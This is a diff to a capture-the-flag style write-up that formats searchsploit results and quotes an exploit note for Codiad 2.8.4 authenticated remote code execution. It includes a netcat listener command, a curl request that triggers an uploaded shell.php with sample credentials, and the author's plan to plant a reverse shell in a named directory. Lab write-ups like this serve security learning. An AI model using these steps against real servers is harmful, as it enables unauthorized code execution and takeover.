@@ -218,6 +218,7 @@ we find a codiad interface which is an IDE. i personally had exploited a codiad 
 ```bash
 searchsploit codiad
 ```
+```bash
 ------------------------------------- ---------------------------------
  Exploit Title                       |  Path
 ------------------------------------- ---------------------------------
@@ -228,6 +229,7 @@ Codiad 2.8.4 - Remote Code Execution | multiple/webapps/49902.py
 Codiad 2.8.4 - Remote Code Execution | multiple/webapps/49907.py
 Codiad 2.8.4 - Remote Code Execution | multiple/webapps/50474.txt
 ------------------------------------- ---------------------------------
+```
 Shellcodes: No Results
 
 i tried the python scripts but none of them worked since the website had two login panels. even after editing the scripts, we could not manage to get a shell. so i will be carrying out the exploit manually. lets get the 50474.txt and read the contents
@@ -236,7 +238,7 @@ i tried the python scripts but none of them worked since the website had two log
 searchsploit -m multiple/webapps/50474.txt
 ```
 the contents of this file is:
-
+```bash
 # Exploit Title: Codiad 2.8.4 - Remote Code Execution (Authenticated) (4)
 # Author: P4p4_M4n3
 # Vendor Homepage: http://codiad.com/
@@ -267,6 +269,7 @@ the contents of this file is:
 1 -  # nc -lnvp 1234
 2 - curl http://target_ip/codiad/themes/default/filemanager/images/codiad/manifest/files/codiad/example/INF/shell.php -u "admin:P@ssw0rd" 
 
+```
 inshort we have to navigate to the themes/default/filemanager/images/codiad/manifest/files/codiad/example/INF/ directory and upload a reverse shell there and then trigger the reverseshell by visiting the location where the shell was uploaded to. lets do this systematically
 
 first navigate to the themes/default/filemanager/images/codiad/manifest/files/codiad/example/INF/ directory.
